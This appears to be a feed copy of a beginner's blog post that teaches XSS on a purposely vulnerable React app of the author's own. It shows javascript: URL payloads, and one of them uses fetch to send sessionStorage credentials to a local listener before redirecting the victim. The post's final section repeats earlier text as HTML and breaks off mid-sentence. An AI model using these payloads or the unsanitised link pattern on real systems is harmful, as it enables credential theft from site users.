    <title>My first attempt at XSS</title>
    <link>https://d.clarkee.co.uk/t/my-first-attempt-at-xss/13871</link>
    <description>As some of you might know, I&#39;m planning to document my journey coming from software development to infosec. This is the first post in the series, I&#39;d be happy for you to give me your _honest_ opinion.


So, as a developer, I&#39;ve heard of [OWASP TOP 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project), let&#39;s pick an example from there - XSS looks interesting and maybe I can create a simple app to break.

### What is XSS?

[OWASP](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) says:

&gt; Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. 

So the gist of it is that through a user input, it&#39;s possible to embed code that can be executed, let&#39;s try that.

I&#39;ve learned that both React and Angular (two major players in the front-end framework scene at the time of writing this post)
tries to protect against XSS out of the box, and as a developer you&#39;ll have to explicitly trust content before allowing the browser to execute it without further sanitation.
It makes the demonstration harder, but not impossible.

I&#39;ve cooked up a React app that allows you to enter a URL and share it with someone else - let&#39;s imagine that it makes sense, like it tracks who clicks, and who closes it without checking out your awesome fortnite videos. It&#39;s a great way to tell who your _real_ friends are™.

```javascript
import React from &#39;react&#39;;
import &#39;./App.css&#39;;

function login() {
  sessionStorage.setItem(&#39;auth&#39;, &#39;c25haWw6aHVudGVyMg==&#39;);
}

function getSharedUrl() {
  return window.location.hash.split(&#39;#&#39;)[1];
}

function App() {
  login();
  const sharedUrl = getSharedUrl();
  const defaultUrl = &#39;http://www.google.com&#39;;
  const [link, setLink] = React.useState(sharedUrl || defaultUrl);

  return (
    &lt;main className=&quot;main&quot;&gt;
      &lt;h1&gt;Awesome Link Creator&lt;/h1&gt;
      {!!sharedUrl ?
        null :
        &lt;input
          type=&quot;text&quot;
          value={link}
          onChange={event =&gt; setLink(event.target.value)}
        /&gt;
      }
      &lt;br/&gt;
      &lt;a href={link}&gt;My awesome link!&lt;/a&gt;
      &lt;br/&gt;
      &lt;p&gt;
        &lt;b&gt;Share it with your friends!&lt;/b&gt;
      &lt;/p&gt;
      &lt;span className=&quot;shareable-url&quot;&gt;{window.location.origin}#{link}&lt;/span&gt;
    &lt;/main&gt;
  );
}

export default App;
```

If you&#39;re not much into React or front-end development, here&#39;s some explanation about the code above:

```javascript
/*
 This is called a React hook - without going into the details,
 this provides us a way of setting an initial value to the variable &quot;link&quot;
 and also gives us a programmatic way of setting its value
*/ 
const [link, setLink] = React.useState(sharedUrl || defaultUrl);
```

```javascript
/*
 We set the input&#39;s value to be &quot;link&quot; and 
 every time a change event is dispatched from the input
 we will set link to be equal to the current value of the input
 */
&lt;input
  type=&quot;text&quot;
  value={link}
  onChange={event =&gt; setLink(event.target.value)}
/&gt;
```

```javascript
/*
 This will be the actual vulnerability here
 */
 &lt;a href={link}&gt;My awesome link!&lt;/a&gt;
```

Right, so we fire up our browser, and see a beautiful, carefully designed, UX award winning application:

![a screenshot of an application with an input](https://hacker-snail.github.io/blog/static/987b7e7fcc0693051d21a368361f0934/566ea/01_app_normal.png)

But how do we know if it&#39;s vulnerable to XSS? The description of XSS mentions something like 
&gt;occur anywhere a web application uses input from a user 

Let&#39;s try that then, but still, _how_ would we know?
It&#39;s a common practice to call the javascript function `alert()` with any argument, like the number `1` - this will tell us if we can continue our research.
If you look at the screenshot, you can see that there&#39;s a shareable URL at the bottom of the page - with the app&#39;s source code above, we know that it&#39;ll generate a link with the user&#39;s input.

That means we need a small addition to our `alert(1)` test, which is to tell the browser to execute it as javascript. We can achieve this by prefixing it with javascript, so the final input will be `javascript:alert(1)`

![application with an input of javascript:alert(1)](https://hacker-snail.github.io/blog/static/331f768523660f58868643d4e8186013/68051/02_basic_command.png)

And yes, if we click &quot;My awesome link!&quot;, we&#39;ll see 1 in a popup.

![javascript popup showing 1](https://hacker-snail.github.io/blog/static/399b0459e2c9106ac12b29881d99d0e7/4961f/03_xss_success.png)

Now, this is good, we know there&#39;s an XSS vulnerability on this page, we can wrap up, thanks for the atte… hold on…

A [brilliant read](https://medium.com/@hakluke/upgrade-xss-from-medium-to-critical-cb96597b6cc4) by Luke Stephens points out that this doesn&#39;t demonstrate well the severity of XSS in modern applications, and he&#39;s right, so let&#39;s see what else we can do.

It&#39;s common practice to store some kind of data in either:
* cookies
* local storage
* session storage
* memory

Let&#39;s see if we have any luck with the above, I&#39;ll open up the developer console in my browser, and see if there&#39;s anything

![empty browser localstorage and some authentication in sessionStorage](https://hacker-snail.github.io/blog/static/ca0696d778be56f6e62bf88b1aac00c3/faf7c/04_storages.png)

That `auth` seems useful, but it&#39;s our own, and we most likely know our own credentials, so not very helpful. 
If we think a bit more, we realise that we can probably send a link to others, so we can access **their** credentials.

Let&#39;s see how could we extract it - we know it&#39;s stored in `sessionStorage`, so we can either write
```javascript
javascript:alert(window.sessionStorage.getItem(&#39;auth&#39;));

// or we can just dump the whole object, maybe there&#39;s more for other users 

javascript:alert(Object.entries(window.sessionStorage))
```
 
![popup with the contents of sessionStorage](https://hacker-snail.github.io/blog/static/290353f119ff8c2080cedbd99dd1f304/9a69f/05_object_entries.png)

We&#39;d still have to find a way to send this data to ourselves, and an alert is probably going to _literally alert_ people. Let&#39;s face it, it&#39;s not very subtle.

I thought of firing up python&#39;s `SimpleHttpServer` by issuing this command `python3 -m http.server` in my terminal.

Next thing is to make a request to it, that&#39;ll leave us with something like

```javascript
javascript:fetch(&#39;http://localhost:8000?params=&#39; + Object.entries(window.sessionStorage), {mode: &#39;no-cors&#39;})
```

Almost there, but the link in the app wouldn&#39;t work, so while it&#39;s better than the above, it still wouldn&#39;t go unnoticed, as users wouldn&#39;t be redirected anywhere.

```javascript
javascript:fetch(&#39;http://localhost:8000?params=&#39; + Object.entries(window.sessionStorage), {mode: &#39;no-cors&#39;}).then(() =&gt; window.location.replace(&#39;http://facebook.com&#39;))
```

Much better! We&#39;ll use [`fetch(url, options)`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) to initiate a request to our server (we could even post the data as the body, but a simple `GET` will do fine in this example), and once that&#39;s finished, we&#39;ll send the user away!

![redirected to facebook with the request to our server](https://hacker-snail.github.io/blog/static/01949d8ee68ec1d20ba99c221412cc2f/46606/06_successful_redirection.png)

As you can see above, we&#39;ve been redirected, but the network tab shows that our request has been made first, and indeed

![logs in terminal and base64 decoded user credentials](https://hacker-snail.github.io/blog/static/116461aabedfb51003fa13f711c219b4/46606/07_caught_request.png)

we received the request containing the credentials. 
It&#39;s common to use Base64 encoded string as the credentials (in the format of `user:password`) for Basic authentication headers, and whenever I see `=` at the end of a string, I always assume that it&#39;s a Base64 encoded string, so let&#39;s check if we can decrypt it (see above).
We succeed, and we get a username and a password for that account.

Now we&#39;ve gone from 
&gt; The app is vulnerable to XSS

all the way to
&gt; It&#39;s possible to get all users&#39; credentials with a single link

We’ll use <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch" rel="noopener nofollow ugc"><code>fetch(url, options)</code></a> to initiate a request to our server (we could even post the data as the body, but a simple <code>GET</code> will do fine in this example), and once that’s finished, we’ll send the user away!</p>
<p><span alt="redirected to facebook with the request to our server" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>As you can see above, we’ve been redirected, but the network tab shows that our request has been made first, and indeed</p>
<p><span alt="logs in terminal and base64 decoded user credentials" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>we received the request containing the credentials.<br>
It’s common to use Base64 encoded string as the credentials (in the format of <code>user:password</code>) for Basic authentication headers, and whenever I see <code>=</code> at the end of a string, I always assume that it’s a Base64 encoded string, so let’s check if we can decrypt it (see above).<br>
We succeed, and we get a username and a password for that account.</p>
<p>Now we’ve gone from</p>
